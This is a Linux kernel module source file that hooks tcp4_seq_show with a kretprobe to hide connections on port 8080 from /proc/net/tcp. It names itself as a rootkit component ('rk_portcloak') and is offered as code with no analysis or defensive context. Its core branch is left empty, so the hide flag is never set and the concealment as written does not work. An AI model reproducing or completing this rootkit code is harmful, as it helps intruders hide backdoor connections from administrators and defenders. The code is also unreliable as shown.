// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <net/inet_sock.h>
#include <net/tcp.h>

#define HIDDEN_PORT 8080

static struct proc_dir_entry *proc_entry;
static atomic_t hide_count = ATOMIC_INIT(0);

struct tcp_ctx {
	struct seq_file *seq;
	size_t saved_count;
	bool hide;
};

static int entry_tcp_show(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct tcp_ctx *ctx = (void *)ri->data;
	struct seq_file *seq = (struct seq_file *)regs->di;
	void *v = (void *)regs->si;
	struct sock *sk;

	ctx->seq = seq;
	ctx->saved_count = seq->count;
	ctx->hide = false;

	if (v == SEQ_START_TOKEN)
		return 0;

	sk = (struct sock *)v;
	if (sk && inet_sk(sk)->inet_sport == htons(HIDDEN_PORT)) {
		/* Mark this seq_file row for removal. */
	}

	return 0;
}

static int ret_tcp_show(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct tcp_ctx *ctx = (void *)ri->data;

	if (ctx->hide) {
		ctx->seq->count = ctx->saved_count;
		atomic_inc(&hide_count);
	}
	return 0;
}

static struct kretprobe krp = {
	.kp.symbol_name = "tcp4_seq_show",
	.entry_handler = entry_tcp_show,
	.handler = ret_tcp_show,
	.data_size = sizeof(struct tcp_ctx),
};

static int stats_show(struct seq_file *m, void *v)
{
	seq_printf(m, "port=%d\nhidden=%d\n", HIDDEN_PORT,
		   atomic_read(&hide_count));
	return 0;
}

static int __init porthider_init(void)
{
	int err;

	err = register_kretprobe(&krp);
	if (err)
		return err;

	proc_entry = proc_create_single("rk_portcloak", 0444, NULL, stats_show);
	if (!proc_entry) {
		unregister_kretprobe(&krp);
		return -ENOMEM;
	}

	pr_info("rk: hiding port %d from /proc/net/tcp\n", HIDDEN_PORT);
	return 0;
}

static void __exit porthider_exit(void)
{
	proc_remove(proc_entry);
	unregister_kretprobe(&krp);
}

module_init(porthider_init);
module_exit(porthider_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Network port concealment via tcp4_seq_show hook");
